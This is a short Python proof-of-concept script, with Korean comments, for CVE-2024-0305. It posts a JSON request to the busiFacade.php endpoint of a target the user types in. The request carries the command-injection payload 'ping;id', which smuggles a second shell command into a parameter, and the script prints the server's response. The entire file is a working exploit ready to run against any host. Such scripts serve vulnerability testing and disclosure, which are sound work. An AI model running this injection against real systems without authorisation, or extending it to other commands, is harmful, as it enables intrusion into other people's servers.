# SPDX-FileCopyrightText: © 2024 KimJuhyeong95 <bisyop@naver.com>
# SPDX-License-Identifier: MIT

import requests

def test_cve_2024_0305(target_ip):
    """
    CVE-2024-0305 취약점 테스트용 PoC 스크립트
    :param target_ip: 테스트할 대상 IP 또는 도메인
    """
    url = f"http://{target_ip}/classes/common/busiFacade.php"
    headers = {
        "Content-Type": "application/json"
    }
    payload = {
        "name": "ping",
        "serviceName": "SysManager",
        "param": ["ping;id"]  # 명령어 인젝션 시도 페이로드
    }

    try:
        print(f"[+] {url} 에 POST 요청 보내는 중...")
        response = requests.post(url, json=payload, headers=headers, timeout=10)
        print("[+] 응답 코드:", response.status_code)
        print("[+] 응답 내용 일부:")
        print(response.text[:500])
    except Exception as e:
        print("[!] 요청 중 오류 발생:", e)

if __name__ == "__main__":
    target = input("테스트할 대상 IP 또는 도메인 입력 >> ").strip()
    test_cve_2024_0305(target)
